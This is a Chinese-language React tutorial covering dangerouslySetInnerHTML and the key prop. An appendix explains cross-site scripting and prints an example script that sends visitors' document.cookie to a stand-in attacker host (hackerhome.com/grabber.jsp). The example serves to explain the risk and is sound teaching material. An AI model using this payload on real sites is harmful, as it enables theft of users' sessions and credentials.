# React元素属性
JSX中有3个常用的非DOM属性，分别是: dangerouslySetInnerHTML、ref、key。

## dangerouslySetInnerHTML属性
在JSX中直接插入HTML代码，但是如果能避免使用这个 属性则尽量避免使用。

滥用innerHTML 可能会导致 cross-site scripting (XSS) 攻击。

我们的设计哲学是让确保安全应该是简单的，开发者在执行“不安全”的操作的时候应该清楚地知道他们自己的意图。dangerouslySetInnerHTML 这个 prop 的命名是故意这么设计的，以此来警告，它的 prop 值（ 一个对象而不是字符串 ）应该被用来表明净化后的数据。

如果服务端在接口上已经对html进行了转义，并且可以完全信任服务端的接口数据，可以使用dangerouslySetInnerHTML。

``` js
var a = {__html:'<a href="http://www.baidu.com">百度一下</a>'};

class Link extends React.Component{
    render(){
        return <div dangerouslySetInnerHTML={this.props.html}></div>
    }
}

ReactDOM.render(<Link html={a}/>,document.querySelector('#box'));
```
</script>

## key
key是一个可选的唯一标识符，通过给组件设置一个独 一无二的键，并确保它在一个渲染周期中保持一致，使得 React能够更只能地决定应该重用一个组件还是销毁并重 建一个组件，进而提高渲染性能。

``` js
class List extends React.Component{
    constructor(props){
        super(props);
        this.state = {
            val:['king','hi','lilei','lucy']
        };
    }
    render(){
        var ls = function(v){
            return v.map(function(a,i){
                return <li key={i}>{a}</li>
            })
        }
        return (
            <ul>{ls(this.state.val)}</ul>
        )
    }
}

ReactDOM.render(<List/>,document.querySelector('#app'))
```
</script>


由数组创建的子组件必须有key属性，否则的话你可能见到下面这样的warning：

> Warning: Each child in an array or iterator should have a unique "key" prop. Check the render method of `ServiceInfo`. See https://fb.me/react-warning-keys for more information.

可能你会发现，这只是warning而不是error，它不是强制性的，为什么react不强制要求用key而报error呢？其实是强制要求的，只不过react为按要求来默认上帮我们做了，它是以数组的index作为key的。


### key的值要稳定唯一
在数组中生成的每项都要有key属性，并且key的值是一个永久且唯一的值，即稳定唯一。

在理想情况下，在循环一个对象数组时，数组的每一项都会有用于区分其他项的一个键值，相当数据库中主键。这样就可以用该属性值作为key值。但是一般情况下可能是没有这个属性值的，这时就需要我们自己保证。

## 附录
### cross-site scripting(XSS)攻击
XSS攻击全称跨站脚本攻击,是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。

让我们首先了解XSS攻击到底是怎样完成的。

就以一个博客应用为例。其常常需要允许读者对博主的文章进行评论。在输入评论的编辑栏中，我们可以输入对该文章的评论，也可以输入以下HTML标记：
``` js
<Script>alert(“XSS attack available!”);</Script>
```
在读者按下提交键之后，该标记将被提交到服务器上，并在其它用户访问时作为评论显示。此时该用户所看到网页中包含该标记的部分元素可能为：
``` js
<div>
    <Script>alert(“XSS attack available!”);</Script>
</div>
```
而从用户的角度来看，该网页中就出现了一个警告。

也就是说，用户输入的脚本语言已经被用户的浏览器成功执行。当然，这可能只是一个对该网站的善意提醒。但是对于一个真正具有恶意的攻击者，其所插入的脚本代码更可能如下所示：
```js
<script>document.write('<img src=http://www.hackerhome.com/grabber.jsp?msg='+document.cookie+'width=16 height=16 border=0 />');</script>
```
该段脚本将向当前评论内插入一个图片，而该图片所对应的URL则指向了hackerhome中的JSP页面grabber.jsp。从访问该评论的用户这一角度看来，其仅仅是一个不能显示的图片。但是对于恶意攻击者而言，该JSP页面将自动记录传入的msg参数内容，即访问评论用户所使用的cookie。该cookie可能包含用户的敏感信息，甚至是用户名，密码等重要信息。

所以，react的做法是不直接读取你的html代码，以此来避免cross-site scripting (XSS)攻击，让你的代码更加安全
